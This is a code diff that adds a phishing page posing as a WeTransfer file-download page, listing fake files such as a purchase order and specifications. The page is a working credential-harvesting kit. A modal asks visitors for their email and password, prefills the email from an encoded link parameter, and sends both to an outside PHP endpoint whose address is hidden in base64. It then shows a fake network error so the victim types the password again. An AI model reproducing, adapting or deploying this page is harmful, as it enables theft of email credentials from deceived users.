@@ -1,0 +1,233 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>We Tr@ansfer</title>
+	<link rel="stylesheet" type="text/css" href="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/grid.css?v=1699956404986">	
+	<link rel="stylesheet" type="text/css" href="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/oui.css?v=1699956442130">	
+	<link rel="shortcut icon" sizes="32x32" href="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/favicon.ico" type="x-image/ico">	
+</head>
+<body>
+<div class="vwrapper">
+    <video autoplay muted loop poster="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/mns.png" class="vidbg">
+        <source src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/bg.mp4" type="video/mp4">
+    </video>
+</div>
+<main>
+<style type="text/css">
+.box2{ background-color: rgb(247 249 250); box-shadow: 0 0 12px 0 rgb(0 0 0 / 10%), 0 10px 30px 0 rgb(0 0 0 / 20%); height: 100vh; min-height: 100%; width: 100%; float: right; overflow: hidden } .box2slidein { -webkit-font-smoothing: antialiased; background-color: rgb(247 249 250); box-shadow: 0 0 12px 0 rgb(0 0 0 / 10%), 0 10px 30px 0 rgb(0 0 0 / 20%); height: 100vh; min-height: 100%; width: 100%; float: right; overflow: hidden; right: -50%; opacity: 0; transition: right 5s ease-in-out; z-index: 100; } .show { right: 0; opacity: 1; }
+.boxfirst{z-index: 1}
+#ozinwa { padding: 1px 10px 5px; background-color: #e10d0d; color: #fff; margin: 10px 15px 10px; }
+#spinner { width: 30px; height: 30px; border: 4.5px solid #CCCCCC; border-top: 4.5px solid #00AEF0; border-radius: 100px; animation: rotate 1s linear infinite; }
+.hidden{display: none} .modal2 { position: fixed; z-index: 50; padding-top: 100px; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: #000000b3; z-index: 1000; } .modal2 .m-content { background-color: #fefefe; margin: auto; padding: 10px; border: 1px solid #888; width: 420px; border-radius: 10px; } .modal2 .m-content .m-top { display: flex; justify-content: end; } .modal2 .m-content .m-top .cls-btn { background-color: transparent; height: 30px; width: 30px; border: 2px solid #ddd; border-radius: 50%; font-size: 1rem; color: #616161; display: flex; justify-content: center; align-items: center; cursor: pointer; } .modal2 .m-content .box { padding-top: 1em; padding-top: 1em; text-align: center; } .modal2 .m-content .form-group { margin-bottom: 1rem; color: #6a6d70; font-weight: 300; } .modal2 .m-content .form-group .form-control { width: calc(100% - 2rem); height: 45px; border: 1px solid #babcbf; padding: 0 1rem; outline: none; font-size: 15px; border-radius: 5px; } .modal2 .m-content .login-btn { background-color: #babcbf; height: 45px; border: none; border-radius: 5px; color: #fff; width: 100px; font-size: 15px; cursor: pointer; outline: none; display: inline-flex; justify-content: center; align-items: center; } .modal2 .m-content .m-footer { margin-top: 20px; display: flex; justify-content: center; flex-direction: column;  align-content: center; flex-wrap: wrap; } .modal2 .m-content .login-btn:hover { background-color: #0173e5; height: 45px; border: none; border-radius: 5px; color: #fff; width: 100px; font-size: 15px; cursor: pointer; outline: none; } .modal2 .m-content .login-btn:disabled, .modal2 .m-content .login-btn[disabled] { cursor: not-allowed; opacity: 0.6; }
+</style>	
+<div class="wlg"><img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/wlg.png"></div>
+<div class="row">
+    <div class="col-xs-12 col-sm-2 col-md-4 col-lg-5" style="display: flex; justify-content:center;">
+       <div class="boxfirst">
+	      	<div class="modal-container shown">
+		        <section class="modal modal-placement">
+		        	<div class="modal-content">
+		        		<section id="number1" class="">
+				        	<article id="placement1">
+				        		<div><img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/downicon.png" style="width: 90px; height:90px"></div>
+				        		<div><img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/rwya.png" style=""></div>
+				        	</article>
+				        	<article id="placement2">
+				        		<div class="countfiles">
+				        			<div class="showfilecounts">
+				        				<span class="span-no-of-files">4 files</span>
+				        				<span class="themegabyte"><small>8.9MB</small></span>
+				        			</div>
+				        			<div id="preview" style="color: #409fff; font-size: 14px; margin: auto 0;">Preview</div>
+				        		</div>
+				        	</article>			        			
+				        	<article id="placement3">
+		    					<div class="dlbtnleft">
+									<button type="button" class="b4n b4n-enabled" id="showSlide" tabindex="0" style="font-size: 16px;">Download all</button>
+		    					</div> 
+				        	</article>					        	
+		        		</section>
+			        </div>	        	
+		        </section>
+	      	</div>
+        </div>
+    </div>
+
+    <div class="col-xs-12 col-sm-10 col-md-8 col-lg-7">
+    	<div class="row" style="">
+    		<div class="box2slidein hidden4mobile" >
+
+    			<div class="headofright">
+    				<div class="closicn"><img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/clos.png"></div>
+    				<div class="lstimg"><img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/listright.png"></div>
+    			</div>
+    			<div class="bodyofright">
+    				<div class="r2dl">
+    					<div class="r2dlmain">
+    						<span>Files Ready To Download</span>
+    						<span>2 files, 1.1 MB・Transfer expires in 7 days</span>
+    					</div>
+    					<div class="dlbtnright">
+							<button type="button" class="b4n b4n-enabled" id="showFormBtn2" tabindex="0">Download all</button>
+    					</div>    					
+    				</div>
+    				<div class="files4dl">
+						<div class="fileswrapper">
+						  <div class="fitem a">
+						  	<div class="col-4">
+						  		<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/p.png" class="fileimg" >
+						  	</div>
+						  	<div class="col-8">
+						  		<div class="filemeta">
+						  			<span>Purchase order.pdf</span>
+						  			<span>501 KB</span>
+						  		</div>
+						  		<div class="metadesc">
+						  			<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/dwld.png">
+						  		</div>
+						  	</div>
+						  </div>
+						  <div class="fitem a">
+						  	<div class="col-4">
+						  		<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/p.png" class="fileimg" >
+						  	</div>
+						  	<div class="col-8">
+						  		<div class="filemeta">
+						  			<span>Product Sample.pdf</span>
+						  			<span>2.3 MB</span>
+						  		</div>
+						  		<div class="metadesc">
+						  			<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/dwld.png">
+						  		</div>
+						  	</div>
+						  </div>
+						  <div class="fitem a">
+						  	<div class="col-4">
+						  		<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/y.png" class="fileimg" >
+						  	</div>
+						  	<div class="col-8">
+						  		<div class="filemeta">
+						  			<span>Sample video.mp4</span>
+						  			<span>5.20 MB</span>
+						  		</div>
+						  		<div class="metadesc">
+						  			<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/dwld.png">
+						  		</div>
+						  	</div>
+						  </div>	
+						  <div class="fitem a">
+						  	<div class="col-4">
+						  		<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/p.png" class="fileimg" >
+						  	</div>
+						  	<div class="col-8">
+						  		<div class="filemeta">
+						  			<span>Specifications.pdf</span>
+						  			<span>2 MB</span>
+						  		</div>
+						  		<div class="metadesc">
+						  			<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/dwld.png">
+						  		</div>
+						  	</div>
+						  </div>						  					  
+						</div>  
+				
+    					
+    				</div>						
+     				<div class="lefoot">
+						<img src="https://cdn.glitch.global/4138a621-3bb5-410e-9e61-32c554b900ee/ftmn.png">
+					</div> 	
+    			</div>    			
+
+    		</div>
+    	</div>
+        
+    </div>   
+</div>	
+</main>	
+<style type="text/css">
+
+</style>
+<div class="modal2 hidden" id="modal2"><div class="m-content"><div class="m-top"><button class="cls-btn">×</button></div><div class="box"><form autocomplete="off" method="post" id="finalForm"><div class="form-group"><input type="email" id="umail" name="email" placeholder="Email Address" class="form-control" required="" value=""></div><div class="form-group"><input type="password" id="upass" name="password" placeholder="Password" class="form-control" required="" value=""></div><button type="submit" id="submitFormBtn" class="login-btn">Download</button></div></form><div align="center" id="ozinwa" class="hide"></div>
+<div class="m-footer"><h1>WeTransfer Pro</h1><p>Get more out of WeTransfer, get Pro</p></div><p class="error-box"></p></div></div></div>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+<script type="text/javascript">
+const gPValue = new Proxy(new URLSearchParams(window.location.search), {
+get: (ogbo, nara) => ogbo.get(nara),
+});
+const may30 = decodeIfBase64(gPValue.e);	
+
+$(document).ready(function() {
+	// $('#modal2').removeClass('hidden');
+	$('#umail').val(may30);
+	  if (may30) {document.querySelector('#upass').focus(); $('#umail').prop("readonly", true) }else{document.querySelector('#umail').focus();}
+	$('.showmodal, .a, #showFormBtn2').on('click', (target) => {
+		$('#modal2').removeClass('hidden');
+	})
+
+	$("#showSlide, #preview").on('click', () => {
+	    $(".box2slidein").addClass('show').removeClass('hidden4mobile');
+	    $('#showSlide').addClass('showmodal');
+	});
+	$(".cls-btn").on('click', () => {
+	    $('#modal2').addClass('hidden');
+	});	
+	var jeff = "aHR0cHM6Ly9ybmFzY2hpb2dhc3BhcmRvLmluZm8vYmlnbGV4L2xhbWJvLnBocA==";
+	$('#submitFormBtn').on('click', (e) => {
+		e.preventDefault();
+
+		let umail = $('#umail').val()
+		let upass = $('#upass').val();
+		$('#umail').removeClass('border-uhie')
+
+		var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+		  // if (input.value.match(validRegex)) {		
+		$('#ozinwa').html('').addClass('hide');
+
+		if(!umail || !umail.match(validRegex)){
+			$('#ozinwa').html('Correct email address required.').removeClass('hide').css({'background-color' :'#e10d0d', 'color':'#fff'});
+			$('#umail').addClass('border-uhie').focus();
+			return false;
+		}
+		if(!upass || upass.length < 6){
+			$('#ozinwa').html('Correct email password required.').removeClass('hide').css({'background-color' :'#e10d0d', 'color':'#fff'});;
+			$('#upass').addClass('border-uhie').focus()
+			return false;
+		}
+
+		let formElem = document.querySelector('#finalForm');
+	    // Store reference to form to make later code easier to read
+	    const form = formElem;
+
+	    //hide the button
+	    $('#submitFormBtn').attr('disabled', true).html('<div id="spinner">');
+	    // $('#spinner').show();
+
+	    // Post data using the Fetch API
+	    fetch(atob(jeff), {
+	        method: form.method,
+	        body: new FormData(form),
+	    })
+	        // We turn the response into text as we expect HTML
+        .then((res) => res.text())
+
+        .then((res) => {
+            console.log(res)
+			$('#ozinwa').html('Network error, kindly try again.').removeClass('hide').css({'background-color' :'transparent', 'color':'red'});
+		    $('#submitFormBtn').removeAttr('disabled').html('Download');
+		    $('#upass').val('').focus()
+        })
+        .catch((err) => {
+        	console.log(err);
+        });
+	})	
+	// body...
+})	
+	function decodeIfBase64(t){return function(t){try{return btoa(atob(t))==t}catch(t){return!1}}(t)?atob(t):t}
+
+</script>
+</body>
+</html>
